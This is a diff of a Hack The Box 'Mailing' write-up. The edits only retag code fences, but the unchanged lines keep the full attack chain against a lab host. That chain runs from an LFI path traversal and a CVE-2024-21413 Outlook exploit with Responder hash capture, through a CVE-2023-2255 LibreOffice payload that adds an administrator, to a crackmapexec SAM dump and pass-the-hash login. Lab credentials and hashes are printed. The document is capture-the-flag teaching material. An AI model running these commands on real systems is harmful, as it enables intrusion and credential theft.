@@ -50,7 +50,7 @@ PORT      STATE SERVICE      REASON
 
 During the aggressive scan, I used the command **`nmap 10.10.11.14 -vv -p25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,55959 -T4 -A`**. While Nmap was busy scanning, I focused my attention on examining the HTTP server. The detailed scan provided me with comprehensive information about the target machine's services and configurations.
 
-```
+```jsx
 PORT      STATE    SERVICE       REASON      VERSION
 25/tcp    open     smtp          syn-ack     hMailServer smtpd
 | smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
@@ -211,7 +211,7 @@ After several attempts of searching for LFI (Local File Inclusion) vulnerabiliti
 
 I stumbled upon an intriguing configuration file path while analyzing the payload: **`..\..\..\..\..\..\..\Program%20Files%20(x86)\hMailServer\Bin\hMailServer.INI`**. This discovery was inspired by an old exploit I found at https://www.exploit-db.com/exploits/7012. Essentially, this exploit provided me with the file structure for locating the hMailServer, specifically the **`hMailServer.INI`** file.
 
-```
+```bash
 [Directories]
 ProgramFolder=C:\Program Files (x86)\hMailServer
 DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
@@ -238,7 +238,7 @@ I attempted to crack the MD5 hashes using hashcat with the command **`hashcat.ex
 
 However, the second hash proved to be resistant to cracking. After some research on Google, I came across a tool called hMailDatabasePasswordDecrypter, available at [https://github.com/GitMirar/hMailDatabasePasswordDecrypter](https://github.com/GitMirar/hMailDatabasePasswordDecrypter). This tool specializes in decrypting blowfish-encrypted hMail database passwords.
 
-```
+```bash
 ┌──(root㉿kali)-[/HTB]
 └─# git clone https://github.com/GitMirar/hMailDatabasePasswordDecrypter.git
 Cloning into 'hMailDatabasePasswordDecrypter'...
@@ -272,7 +272,7 @@ After further enumeration regarding hMailServer, I came across an exploit that c
 
 After running Responder, I executed the following command:
 
-```
+```bash
 ┌──(root㉿kali)-[/HTB/Mailing/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability]
 └─# python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient mayay email pls look hi'
 
@@ -284,13 +284,13 @@ Alexander Hagenah / @xaitax / ah@primepage.de
 
 After sending the email, I monitored Responder, and to my satisfaction, I observed that it captured a user hash. 
 
-```
+```bash
 maya::MAILING:dac4fe0aec512cc8:0ABF7016C9D7428230E543395441DBCD:010100000000000000EF6F99469EDA01293B5F358D9EF4DE0000000002000800540058005800340001001E00570049004E002D00380038003200520041004E005000380044004500500004003400570049004E002D00380038003200520041004E00500038004400450050002E0054005800580034002E004C004F00430041004C000300140054005800580034002E004C004F00430041004C000500140054005800580034002E004C004F00430041004C000700080000EF6F99469EDA01060004000200000008003000300000000000000000000000002000009BE5ABAC0CB766267616E7031B83C21B57E7A52A6903503167DE1974F23E1F3B0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0035000000000000000000
 ```
 
 I cracked the above hash with the following command:
 
-```
+```bash
 hashcat.exe -m 5600 myhash.txt rockyou.txt --self-test-disable
 ```
 
@@ -302,7 +302,7 @@ I came across LibreOffice installed in the Program Files directory, and upon fur
 
 To exploit this vulnerability, I executed the following Python code:
 
-```arduino
+```bash
 python3 CVE-2023-2255.py --cmd 'net localgroup Administrators maya /add' --output 'exploit.odt'
 ```
 
@@ -316,7 +316,7 @@ impacket-smbserver mailing `pwd` -smb2support
 
 Then, within the Evil-WinRM shell, I executed the following commands:
 
-```go
+```bash
 net use \\10.10.14.98\mailing
 copy \\10.10.14.98\mailing\exploit.odt
 ```
@@ -329,13 +329,13 @@ After copying the **`exploit.odt`** file from the SMB server, I waited for a few
 
 With confirmation of elevated privileges, I proceeded to dump the hashes using the crackmapexec command:
 
-```css
+```bash
 crackmapexec smb 10.10.11.14 -u maya -p "m4y4ngs4ri" --sam
 ```
 
 This command allowed me to retrieve the SAM (Security Account Manager) database hashes from the target system.
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ crackmapexec smb 10.10.11.14 -u maya -p "m4y4ngs4ri" --sam
 [*] First time use detected
@@ -360,14 +360,13 @@ SMB         10.10.11.14     445    MAILING          WDAGUtilityAccount:504:aad3b
 SMB         10.10.11.14     445    MAILING          localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
 SMB         10.10.11.14     445    MAILING          maya:1002:aad3b435b51404eeaad3b435b51404ee:af760798079bf7a3d80253126d3d28af:::
 SMB         10.10.11.14     445    MAILING          [+] Added 6 SAM hashes to the database
-
 ```
 
 Now, to gain root access to the box without cracking the hash, I can log in using the hash we previously dumped.
 
 I'll use the following command with impacket-wmiexec:
 
-```css
+```bash
 impacket-wmiexec localadmin@10.10.11.14 -hashes "aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae"
 ```
 
